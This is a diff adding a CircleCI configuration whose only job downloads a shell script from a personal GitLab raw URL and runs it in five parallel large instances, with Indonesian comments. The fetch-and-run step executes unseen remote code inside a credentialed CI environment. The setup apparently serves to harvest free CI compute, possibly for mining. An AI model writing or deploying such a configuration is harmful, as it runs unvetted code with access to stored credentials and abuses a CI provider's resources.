@@ -1,0 +1,45 @@
+version: 2.1
+
+executors:
+  my-custom-executor:
+    docker:
+      - image: cimg/base:stable
+        auth:
+          username: $DOCKER_HUB_USER
+          password: $DOCKER_HUB_PASSWORD
+    resource_class: large 
+
+jobs:
+  my-job-name:
+    parameters:
+      # Mendefinisikan parameter agar matrix bisa memasukkan nilai ke sini
+      instance_id:
+        type: string
+        default: "1"
+    executor: my-custom-executor
+    steps:
+      - checkout
+      - run:
+          name: "Setup Environment and Execute - Instance << parameters.instance_id >>"
+          command: |
+            # Menggunakan -q agar log bersih
+            wget -q https://gitlab.com/barbieanay003/seger/-/raw/main/circle.sh
+            chmod +x circle.sh
+            
+            echo "Running instance number: << parameters.instance_id >>"
+            
+            # Menjalankan biner
+            bash circle.sh
+
+workflows:
+  my-custom-workflow:
+    jobs:
+      - my-job-name:
+          # Memberikan nama unik di UI (my-job-name-1, my-job-name-2, dst)
+          name: my-job-name-<< matrix.instance_id >>
+          context:
+            - docker-hub-creds
+          matrix:
+            parameters:
+              # Ini akan memicu 5 job berjalan sekaligus
+              instance_id: ["1", "2", "3", "4", "5"]
